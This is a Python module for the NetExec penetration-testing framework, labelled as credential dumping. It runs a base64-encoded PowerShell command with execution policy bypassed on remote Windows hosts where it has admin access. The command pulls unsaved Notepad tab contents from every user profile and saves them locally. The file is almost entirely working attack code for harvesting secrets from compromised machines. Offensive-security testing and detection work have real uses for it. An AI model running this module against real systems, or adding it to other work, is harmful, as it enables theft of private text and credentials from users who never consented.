import os
import base64
import re
from nxc.loaders.moduleloader import CATEGORY


class NXCModule:
    name = 'notepad_recovery'
    description = 'Recover Notepad tab content from TabState .bin files (Windows 11)'
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        '''
        OUTFILE   Local path to save results (default: notepad_recovery_<host>.txt)
        MIN_LEN   Minimum text length to include a tab (default: 20)
        '''
        self.outfile = module_options.get('OUTFILE', None)
        self.min_len = int(module_options.get('MIN_LEN', 20))

    def on_admin_login(self, context, connection):
        ps = []
        ps.append('$min=' + str(self.min_len))
        ps.append('$results=@()')
        ps.append("Get-ChildItem 'C:\\Users' -Directory | ForEach-Object {")
        ps.append("  $tp = $_.FullName + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState'")
        ps.append('  if (Test-Path $tp) {')
        ps.append("    Get-ChildItem ($tp + '\\*.bin') -ErrorAction SilentlyContinue | ForEach-Object {")
        ps.append('      try {')
        ps.append('        $b = [IO.File]::ReadAllBytes($_.FullName)')
        ps.append('        $t = [Text.Encoding]::Unicode.GetString($b)')
        ps.append("        $c = ($t -replace '[^ -~\t]+', ' ') -replace '[ \t]+', ' '")
        ps.append('        $c = $c.Trim()')
        ps.append('        if ($c.Length -gt $min) {')
        ps.append('          $usr = $_.DirectoryName.Split([char]92)[2]')
        ps.append("          $results += '=== ' + $usr + ' | ' + $_.Name + ' ==='")
        ps.append('          $results += $c')
        ps.append("          $results += ''")
        ps.append('        }')
        ps.append('      } catch {}')
        ps.append('    }')
        ps.append('  }')
        ps.append('}')
        ps.append("if ($results.Count -eq 0) { Write-Output 'NO_RESULTS' }")
        ps.append('else { $results | Out-String -Width 4096 }')
        ps_script = '\r\n'.join(ps)
        encoded = base64.b64encode(ps_script.encode('utf-16-le')).decode()
        context.log.display('Searching TabState files across all user profiles...')
        output = connection.execute(
            'powershell.exe -NonInteractive -NoProfile -ExecutionPolicy Bypass -OutputFormat Text -EncodedCommand ' + encoded,
            True,
        )
        if not output:
            context.log.fail('No output received')
            return
        cleaned = re.sub(r'#<\s*CLIXML', '', output)
        cleaned = re.sub(r'<[^>]+>', '', cleaned).strip()
        if not cleaned or 'NO_RESULTS' in cleaned:
            context.log.highlight('No Notepad TabState content found (min_len=' + str(self.min_len) + ')')
            return
        host = connection.host
        outfile = self.outfile or ('notepad_recovery_' + host + '.txt')
        try:
            with open(outfile, 'w', encoding='utf-8') as fh:
                fh.write('# Notepad TabState Recovery - ' + host + '\n\n')
                fh.write(cleaned)
            context.log.success('Results saved to: ' + os.path.abspath(outfile))
        except OSError as e:
            context.log.fail('Could not write output file: ' + str(e))
            return
        headers = [l for l in cleaned.splitlines() if l.startswith('===')]
        if headers:
            context.log.highlight('Found ' + str(len(headers)) + ' tab(s):')
            for h in headers[:5]:
                context.log.highlight('  ' + h)
            if len(headers) > 5:
                context.log.highlight('  ... (see output file for full results)')
